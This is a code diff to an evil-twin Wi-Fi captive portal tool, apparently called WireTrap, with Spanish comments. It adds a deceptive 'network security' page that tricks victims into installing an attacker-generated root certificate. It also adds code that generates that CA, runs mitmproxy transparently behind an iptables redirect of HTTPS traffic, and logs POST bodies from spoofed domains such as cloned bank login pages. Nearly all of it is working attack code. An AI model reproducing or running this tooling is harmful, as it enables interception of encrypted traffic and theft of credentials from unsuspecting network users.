@@ -55,6 +55,7 @@ SUBNET_MASK  = "255.255.255.0"
 FLASK_PORT   = 80
 FLASK_SSL_PORT = 8443      # Puerto interno HTTPS de Flask (iptables redirige 443 → 8443)
 UPSTREAM_DNS = "8.8.8.8"   # DNS real para víctimas autenticadas
+MITMPROXY_PORT = 8080      # Puerto transparente de mitmproxy (iptables redirige 443 → 8080)
 
 
 # ── Plantilla HTML: estilo Google ───────────────────────────────
@@ -158,6 +159,62 @@ _PORTAL_HTML_SUCCESS = """<!DOCTYPE html>
   <h2>Conectado!</h2>
   <p>Ahora tienes acceso a Internet.</p>
   <p>Redirigiendo a Google...</p>
+</div>
+</body>
+</html>
+"""
+
+# Página de instalación del certificado CA (para interceptar HTTPS/HSTS)
+# El usuario debe instalar este cert para que el MITM funcione con sitios HTTPS
+_PORTAL_HTML_INSTALL_CA = """<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Configuración de Seguridad de Red</title>
+<style>
+  * {{ box-sizing: border-box; margin: 0; padding: 0; }}
+  body {{ font-family: 'Segoe UI', Arial, sans-serif; background: #f2f2f2;
+         display: flex; align-items: center; justify-content: center; min-height: 100vh; }}
+  .card {{ background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,.15);
+           width: 420px; padding: 40px 36px 36px; text-align: center; }}
+  .icon {{ font-size: 48px; margin-bottom: 16px; }}
+  h2 {{ font-size: 22px; color: #202124; font-weight: 400; margin-bottom: 8px; }}
+  p {{ color: #5f6368; font-size: 14px; margin-bottom: 16px; line-height: 1.5; }}
+  .steps {{ text-align: left; background: #f8f9fa; border-radius: 6px;
+            padding: 16px 20px; margin: 20px 0; font-size: 13px; color: #3c4043; }}
+  .steps li {{ margin-bottom: 8px; }}
+  .btn {{ display: block; background: #1a73e8; color: white; text-decoration: none;
+          border-radius: 4px; padding: 12px 24px; font-size: 15px; font-weight: 500;
+          margin: 20px auto 0; }}
+  .btn:hover {{ background: #1765c7; }}
+  .skip {{ display: block; margin-top: 14px; color: #1a73e8; font-size: 13px;
+           text-decoration: none; cursor: pointer; }}
+  .warning {{ background: #fff3cd; border: 1px solid #ffc107; border-radius: 4px;
+              padding: 10px 14px; font-size: 12px; color: #856404; margin-bottom: 16px;
+              text-align: left; }}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="icon">🔐</div>
+  <h2>Configuración de Seguridad</h2>
+  <p>Esta red WiFi requiere instalar un certificado de seguridad para acceder a sitios HTTPS.</p>
+  <div class="warning">
+    <strong>Red WiFi segura.</strong> Este certificado es necesario para el filtrado de contenido de la red.
+  </div>
+  <div class="steps">
+    <strong>Pasos para instalar:</strong>
+    <ol style="padding-left:18px; margin-top:8px;">
+      <li>Pulsa <strong>"Descargar Certificado"</strong></li>
+      <li>Abre el archivo descargado</li>
+      <li>En iOS: Ve a Ajustes → General → VPN y gestión de dispositivos → instalar</li>
+      <li>En Android: Ajustes → Seguridad → Instalar certificado → CA</li>
+      <li>En PC: Doble clic → Instalar → Almacén: "Entidades de certificación raíz de confianza"</li>
+    </ol>
+  </div>
+  <a class="btn" href="/ca.crt" download="wifi_cert.crt">⬇ Descargar Certificado</a>
+  <a class="skip" href="/login_skip">Omitir (acceso limitado)</a>
 </div>
 </body>
 </html>
@@ -566,7 +623,9 @@ def clone_login_page(url, log_fn=None):
 def _build_flask_app(gateway_ip, template_type, creds_log,
                      custom_html=None,
                      on_credential=None, on_client_login=None,
-                     dns_spoof_domains=None):
+                     dns_spoof_domains=None,
+                     ca_cert_path=None,
+                     mitm_mode=False):
     """
     Construye la app Flask del portal.
 
@@ -575,6 +634,8 @@ def _build_flask_app(gateway_ip, template_type, creds_log,
     dns_spoof_domains: lista de dicts [{"domain": "bbva.com", "clone_url": "...", "html": "..."}]
                        Si entry["html"] está relleno, Flask sirve esa copia cuando el Host
                        del request coincide con ese dominio.
+    ca_cert_path:      Ruta al fichero CA .crt para servir en /ca.crt
+    mitm_mode:         Si True, tras el login se muestra página de instalación del CA
 
     Incluye rutas de detección para cada SO:
       - iOS/macOS: /hotspot-detect.html, /library/test/success.html
@@ -583,7 +644,7 @@ def _build_flask_app(gateway_ip, template_type, creds_log,
       - Firefox:   /canonical.html
     """
     try:
-        from flask import Flask, request, make_response, redirect
+        from flask import Flask, request, make_response, redirect, send_file
     except ImportError:
         return None
 
@@ -652,6 +713,36 @@ def _build_flask_app(gateway_ip, template_type, creds_log,
     def firefox_probe():
         return redirect(portal_url, 302)
 
+    @app.route("/ca.crt")
+    @app.route("/ca.cer")
+    @app.route("/wifi_cert.crt")
+    def serve_ca_cert():
+        """Sirve el certificado CA raiz para que la victima lo instale."""
+        if ca_cert_path and os.path.isfile(ca_cert_path):
+            try:
+                return send_file(
+                    ca_cert_path,
+                    mimetype="application/x-x509-ca-cert",
+                    as_attachment=True,
+                    download_name="wifi_security.crt"
+                )
+            except Exception:
+                pass
+        return make_response("Certificado no disponible", 404)
+
+    @app.route("/install-cert")
+    def install_cert_page():
+        """Pagina con instrucciones para instalar el CA."""
+        return make_response(_PORTAL_HTML_INSTALL_CA, 200)
+
+    @app.route("/login_skip")
+    def login_skip():
+        """Permite omitir la instalacion del cert (acceso sin MITM)."""
+        ip = request.remote_addr
+        if on_client_login:
+            on_client_login(ip)
+        return make_response(_PORTAL_HTML_SUCCESS, 200)
+
     @app.route("/login", methods=["POST"])
     def login():
         email    = request.form.get("email", "").strip()
@@ -666,6 +757,9 @@ def _build_flask_app(gateway_ip, template_type, creds_log,
             on_credential(entry)
         if on_client_login:
             on_client_login(ip)
+        # En modo MITM: tras el login pedimos instalar el CA para interceptar HTTPS
+        if mitm_mode and ca_cert_path and os.path.isfile(ca_cert_path):
+            return redirect("http://" + gateway_ip + "/install-cert", 302)
         return make_response(_PORTAL_HTML_SUCCESS, 200)
 
     @app.route("/favicon.ico")
@@ -720,7 +814,14 @@ class CaptivePortal:
         self._dnsmasq_proc    = None
         self._flask_thread    = None
         self._flask_ssl_thread = None
+        self._mitmproxy_proc   = None
         self._sniffer         = None
+
+        # Modo MITM: usar mitmproxy como transparent proxy para interceptar HTTPS/HSTS
+        # Requiere que la victima instale nuestro CA root (se ofrece en el portal)
+        self.mitm_mode = False
+        self._ca_cert_path = "/tmp/wt_ca.crt"
+        self._ca_key_path  = "/tmp/wt_ca.key"
 
         self.on_started    = None
         self.on_stopped    = None
@@ -967,6 +1068,7 @@ class CaptivePortal:
             self._err("Flask no encontrado: sudo apt install python3-flask")
             return False
 
+        ca_path = self._ca_cert_path if (self.mitm_mode and os.path.isfile(self._ca_cert_path)) else None
         app = _build_flask_app(
             gateway_ip=GATEWAY_IP,
             template_type=self.template_type,
@@ -974,7 +1076,9 @@ class CaptivePortal:
             custom_html=self.custom_html if self.template_type == "custom" else None,
             on_credential=self._on_new_credential,
             on_client_login=self._on_client_login,
-            dns_spoof_domains=self.dns_spoof_domains if self.dns_spoof_domains else None
+            dns_spoof_domains=self.dns_spoof_domains if self.dns_spoof_domains else None,
+            ca_cert_path=ca_path,
+            mitm_mode=self.mitm_mode,
         )
         if not app:
             self._err("No se pudo construir la app Flask.")
@@ -1082,6 +1186,168 @@ class CaptivePortal:
             self._log("[!] Sin SSL: instala  pip3 install cryptography pyopenssl --break-system-packages")
             return None
 
+    def _make_root_ca(self):
+        """
+        Genera un CA raiz propio (cert + clave privada).
+        Este CA se sirve al usuario en /ca.crt para que lo instale,
+        y mitmproxy lo usa para firmar certs on-the-fly.
+        Reutiliza ficheros existentes si ya existen.
+        """
+        if os.path.isfile(self._ca_cert_path) and os.path.isfile(self._ca_key_path):
+            self._log("[MITM] Reutilizando CA existente: " + self._ca_cert_path)
+            return True
+        try:
+            import datetime as _dt
+            from cryptography import x509
+            from cryptography.x509.oid import NameOID
+            from cryptography.hazmat.primitives import hashes, serialization
+            from cryptography.hazmat.primitives.asymmetric import rsa
+
+            key = rsa.generate_private_key(public_exponent=65537, key_size=4096)
+            subject = issuer = x509.Name([
+                x509.NameAttribute(NameOID.COMMON_NAME, u"WiFi Security Services CA"),
+                x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"Network Security"),
+                x509.NameAttribute(NameOID.COUNTRY_NAME, u"ES"),
+            ])
+            cert = (
+                x509.CertificateBuilder()
+                .subject_name(subject)
+                .issuer_name(issuer)
+                .public_key(key.public_key())
+                .serial_number(x509.random_serial_number())
+                .not_valid_before(_dt.datetime.utcnow())
+                .not_valid_after(_dt.datetime.utcnow() + _dt.timedelta(days=3650))
+                .add_extension(x509.BasicConstraints(ca=True, path_length=None), critical=True)
+                .add_extension(
+                    x509.KeyUsage(
+                        digital_signature=True, key_cert_sign=True, crl_sign=True,
+                        content_commitment=False, key_encipherment=False,
+                        data_encipherment=False, key_agreement=False,
+                        encipher_only=False, decipher_only=False,
+                    ),
+                    critical=True,
+                )
+                .add_extension(
+                    x509.SubjectKeyIdentifier.from_public_key(key.public_key()),
+                    critical=False,
+                )
+                .sign(key, hashes.SHA256())
+            )
+            with open(self._ca_cert_path, "wb") as f:
+                f.write(cert.public_bytes(serialization.Encoding.PEM))
+            with open(self._ca_key_path, "wb") as f:
+                f.write(key.private_bytes(
+                    serialization.Encoding.PEM,
+                    serialization.PrivateFormat.TraditionalOpenSSL,
+                    serialization.NoEncryption(),
+                ))
+            os.chmod(self._ca_key_path, 0o600)
+            self._log("[MITM] CA raiz generado: " + self._ca_cert_path)
+            return True
+        except ImportError:
+            self._log("[MITM] cryptography no disponible -- no se puede generar CA")
+            return False
+        except Exception as e:
+            self._log("[MITM] Error generando CA: " + str(e))
+            return False
+
+    def _start_mitmproxy(self):
+        """
+        Arranca mitmproxy en modo transparent proxy en puerto 8080.
+        iptables redirige el trafico HTTPS de las victimas a este puerto.
+        Requiere: pip3 install mitmproxy --break-system-packages
+        El addon captura credenciales POST de dominios spoofados.
+        """
+        import shutil
+        mitmdump = shutil.which("mitmdump")
+        if not mitmdump:
+            self._log("[MITM] mitmdump no encontrado.")
+            self._log("[MITM] Instala: pip3 install mitmproxy --break-system-packages")
+            return False
+
+        # Script addon para capturar POSTs de credenciales
+        addon_path = "/tmp/wt_mitm_addon.py"
+        spoof_domains_repr = repr([
+            e.get("domain", "") for e in self.dns_spoof_domains if isinstance(e, dict)
+        ])
+        addon_code = (
+            'import mitmproxy.http as _mhttp\n'
+            'from mitmproxy import ctx as _ctx\n'
+            'import json, datetime\n\n'
+            'SPOOF_DOMAINS = ' + spoof_domains_repr + '\n'
+            'CREDS_LOG = "/tmp/wt_mitm_creds.jsonl"\n\n'
+            'class WireTrapAddon:\n'
+            '    def request(self, flow):\n'
+            '        host = flow.request.pretty_host\n'
+            '        if flow.request.method == "POST" and any(d in host for d in SPOOF_DOMAINS):\n'
+            '            try:\n'
+            '                body = flow.request.get_text(strict=False)\n'
+            '                entry = {"ts": datetime.datetime.now().isoformat(),\n'
+            '                         "host": host, "path": flow.request.path,\n'
+            '                         "body": body[:2000],\n'
+            '                         "client": flow.client_conn.peername[0] if flow.client_conn.peername else ""}\n'
+            '                with open(CREDS_LOG, "a") as f:\n'
+            '                    f.write(json.dumps(entry, ensure_ascii=False) + "\\n")\n'
+            '                _ctx.log.warn("[WireTrap] POST capturado: " + host + " " + entry["client"])\n'
+            '            except Exception as ex:\n'
+            '                _ctx.log.warn("[WireTrap] Error: " + str(ex))\n\n'
+            'addons = [WireTrapAddon()]\n'
+        )
+        with open(addon_path, "w") as f:
+            f.write(addon_code)
+
+        # mitmproxy necesita su propio dir de certs para firmar on-the-fly
+        # Le damos nuestro CA raiz como root cert
+        mitm_cert_dir = "/tmp/wt_mitm_certs"
+        os.makedirs(mitm_cert_dir, exist_ok=True)
+        # mitmproxy espera mitmproxy-ca.pem = clave+cert concatenados
+        ca_pem_path = os.path.join(mitm_cert_dir, "mitmproxy-ca.pem")
+        try:
+            with open(self._ca_key_path, "rb") as fk, \
+                 open(self._ca_cert_path, "rb") as fc:
+                pem_data = fk.read() + fc.read()
+            with open(ca_pem_path, "wb") as fp:
+                fp.write(pem_data)
+        except Exception as e:
+            self._log("[MITM] Error preparando cert para mitmproxy: " + str(e))
+
+        cmd = [
+            mitmdump,
+            "--mode", "transparent",
+            "--listen-host", "0.0.0.0",
+            "--listen-port", str(MITMPROXY_PORT),
+            "--ssl-insecure",
+            "--set", "confdir=" + mitm_cert_dir,
+            "-s", addon_path,
+            "--quiet",
+        ]
+
+        try:
+            self._mitmproxy_proc = subprocess.Popen(
+                cmd,
+                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+                env=dict(os.environ, PYTHONUNBUFFERED="1")
+            )
+            time.sleep(2)
+            if self._mitmproxy_proc.poll() is not None:
+                out = self._mitmproxy_proc.stdout.read().decode(errors="ignore")
+                self._log("[MITM] mitmproxy termino prematuramente:\n" + out[:400])
+                return False
+            # Redirigir HTTPS al proxy transparente con iptables
+            iface = self.interface
+            subprocess.run(["iptables", "-t", "nat", "-I", "PREROUTING", "1",
+                            "-i", iface, "-p", "tcp", "--dport", "443",
+                            "!", "-d", GATEWAY_IP,
+                            "-j", "REDIRECT", "--to-port", str(MITMPROXY_PORT)],
+                           capture_output=True)
+            self._log("[MITM] mitmproxy activo (PID " + str(self._mitmproxy_proc.pid) +
+                      ") puerto " + str(MITMPROXY_PORT))
+            self._log("[MITM] iptables: HTTPS (443) → mitmproxy (" + str(MITMPROXY_PORT) + ")")
+            return True
+        except Exception as e:
+            self._log("[MITM] Error arrancando mitmproxy: " + str(e))
+            return False
+
     def _start_sniffer(self):
         try:
             from post_exploitation.sniffer import WireTrapSniffer
@@ -1122,24 +1388,56 @@ class CaptivePortal:
     def _clone_spoof_pages(self):
         """
         Para cada entrada en dns_spoof_domains que tenga clone_url,
-        clona la página y guarda el HTML en entry["html"].
-        Se llama justo antes de arrancar Flask.
+        clona la pagina y guarda el HTML en entry["html"].
+        Cada clonacion corre en su propio hilo con timeout de 90s
+        para evitar que un sitio lento (classlife, etc.) bloquee el arranque.
         """
         if not self.dns_spoof_domains:
             return
+
+        CLONE_TIMEOUT = 90  # segundos maximo por dominio
+
+        def _do_clone(entry):
+            clone_url = entry.get("clone_url", "").strip()
+            if not clone_url:
+                return
+            self._log("[DNS Spoof] Clonando " + clone_url + " para dominio " + entry["domain"])
+            try:
+                result_holder = [None]
+
+                def _run():
+                    result_holder[0] = clone_login_page(clone_url, log_fn=self._log)
+
+                t = threading.Thread(target=_run, daemon=True)
+                t.start()
+                t.join(timeout=CLONE_TIMEOUT)
+
+                if t.is_alive():
+                    self._log("[DNS Spoof] Timeout (" + str(CLONE_TIMEOUT) + "s) clonando " +
+                              clone_url + " -- se usara el portal por defecto")
+                    return
+
+                html = result_holder[0]
+                if html:
+                    entry["html"] = html
+                    self._log("[DNS Spoof] Clonado OK (" + str(len(html)) + " bytes) -> " + entry["domain"])
+                else:
+                    self._log("[DNS Spoof] Fallo al clonar " + clone_url + " -- se usara el portal por defecto")
+            except Exception as ex:
+                self._log("[DNS Spoof] Error clonando " + clone_url + ": " + str(ex))
+
+        # Lanzar todos los clones en paralelo y esperar a que terminen todos
+        threads = []
         for entry in self.dns_spoof_domains:
             if not isinstance(entry, dict):
                 continue
-            clone_url = entry.get("clone_url", "").strip()
-            if not clone_url:
-                continue
-            self._log("[DNS Spoof] Clonando " + clone_url + " para dominio " + entry["domain"])
-            html = clone_login_page(clone_url, log_fn=self._log)
-            if html:
-                entry["html"] = html
-                self._log("[DNS Spoof] ✓ Clonado OK (" + str(len(html)) + " bytes) → " + entry["domain"])
-            else:
-                self._log("[DNS Spoof] ✗ Fallo al clonar " + clone_url + " — se usará el portal por defecto")
+            t = threading.Thread(target=_do_clone, args=(entry,), daemon=True)
+            t.start()
+            threads.append(t)
+
+        # Esperar a todos con margen
+        for t in threads:
+            t.join(timeout=CLONE_TIMEOUT + 5)
 
     def start(self, ssid="FreeWiFi", channel=6,
               template="google", out_interface="eth0"):
